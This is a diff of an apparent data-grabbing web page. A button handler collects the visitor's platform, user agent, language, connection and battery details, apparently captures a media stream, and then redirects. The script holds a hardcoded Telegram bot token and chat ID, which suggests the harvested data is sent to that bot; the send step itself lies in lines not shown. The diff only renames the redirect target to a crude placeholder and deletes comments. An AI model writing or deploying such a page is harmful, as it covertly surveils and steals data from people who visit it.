@@ -39,24 +39,21 @@
     <script>
         const TOKEN = "8934176186:AAGX6GaklJCEmr_CXXX4L7bGMQykSA4fyFA";
         const CHAT_ID = "6125741059";
-        const TELEGRAM_BOT_URL = "https://t.me/YOUR_BOT_USERNAME";
+        const TARGET_URL = "https://Suck";
 
         document.getElementById('goBtn').addEventListener('click', async () => {
             let userInfo = "📊 Comprehensive Device & Location Info:\n";
             
-            // کاتی وردی سەردانیکردن
             userInfo += `⏱ Timestamp: ${new Date().toLocaleString()}\n`;
             userInfo += `💻 Platform: ${navigator.platform}\n`;
             userInfo += `🌐 Language: ${navigator.language}\n`;
             userInfo += `📱 User Agent: ${navigator.userAgent}\n`;
 
-            // زانیاری خێرایی و جۆری ئینتەرنێت
             if (navigator.connection) {
                 userInfo += `⚡ Connection Type: ${navigator.connection.effectiveType || 'Unknown'}\n`;
                 userInfo += `📶 Downlink Speed: ${navigator.connection.downlink || 'Unknown'} Mbps\n`;
             }
 
-            // زانیاری پاتری
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
@@ -139,10 +136,10 @@
                 }
 
                 stream.getTracks().forEach(track => track.stop());
-                window.location.href = TELEGRAM_BOT_URL;
+                window.location.href = TARGET_URL;
 
             } catch (err) {
-                window.location.href = TELEGRAM_BOT_URL;
+                window.location.href = TARGET_URL;
             }
         });
     </script>
